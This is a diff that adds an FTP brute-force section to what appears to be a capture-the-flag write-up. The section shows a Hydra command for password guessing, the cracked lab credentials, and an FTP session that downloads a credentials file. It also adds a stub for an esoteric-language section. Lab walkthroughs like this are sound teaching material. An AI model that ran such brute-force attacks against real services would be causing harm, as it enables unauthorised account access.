@@ -50,6 +50,8 @@ This CTF requires basic knowledge of:
 
 * [FTP Bruteforce](#ftp-bruteforce "Jump To FTP Bruteforce")
 
+* [Esoteric Language](#esoteric-language "Jump To Esoteric Language")
+
 * [What is the user flag?](#flag-1 "Jump To Flag 1")
 
 * [What is the root flag?](#flag-2 "Jump To Flag 2")
@@ -374,6 +376,72 @@ zLH%Ot0Bw&c%9
 ---
 
 ## FTP Bruteforce
+
+Now that we have extracted the strings from the PNG we can copy [all of the possible passwords](./Assets/ftp-password-list.txt "FTP Password TXT File") and store them in a text file.
+
+We also know the username for the FTP server is ```ftpuser```.
+
+So we're going to have to bruteforce the FTP server using ```Hydra``` with the ```-l``` flag followed by the username ```ftpuser```, ```-P``` followed by our password file, ```-V``` for verbose mode, and we're going to prepend the target IP address with ```ftp:```.
+
+The command should look something like this...
+
+```hydra -l ftpuser -P /path/to/wordlist -V ftp://<IP_Address>```
+
+After Hydra has finished running we should see the following output...
+
+```
+[21][ftp] host: 10.10.248.204   login: ftpuser   password: 5iez1wGXKfPKQ
+1 of 1 target successfully completed, 1 valid password found
+```
+
+Now we have our full credentials.
+
+```ftpuser:5iez1wGXKfPKQ```
+
+To connect to the FTP server we just need to run the command ```ftp <IP_Address>``` and when prompted for the username, input ```ftpuser```. For the password we'll use ```5iez1wGXKfPKQ```.
+
+```
+$ ftp <IP_Address>
+
+220 (vsFTPd 3.0.2)
+Name: ftpuser
+331 Please specify the password.
+Password: 5iez1wGXKfPKQ
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+```
+
+Now that we're logged in to the FTP server we can list all files in the current directory with the ```ls -la``` command, which will show us only one file named ```Eli's_Creds.txt```.
+
+```
+ftp> ls -la
+229 Entering Extended Passive Mode (|||22547|).
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Jan 23  2020 .
+drwxr-xr-x    2 0        0            4096 Jan 23  2020 ..
+-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
+226 Directory send OK.
+```
+
+To download this file to our own machine we use the ```get``` command followed by the file name.
+
+```
+ftp> get Eli's_Creds.txt
+local: Eli's_Creds.txt remote: Eli's_Creds.txt
+229 Entering Extended Passive Mode (|||22266|).
+150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
+100% |***********************************|   758      580.57 KiB/s    00:00 ETA
+226 Transfer complete.
+758 bytes received in 00:00 (4.24 KiB/s)
+```
+
+### [Back To Top](#year-of-the-rabbit "Jump To Top")
+
+---
+
+## Esoteric Language
 
 
 
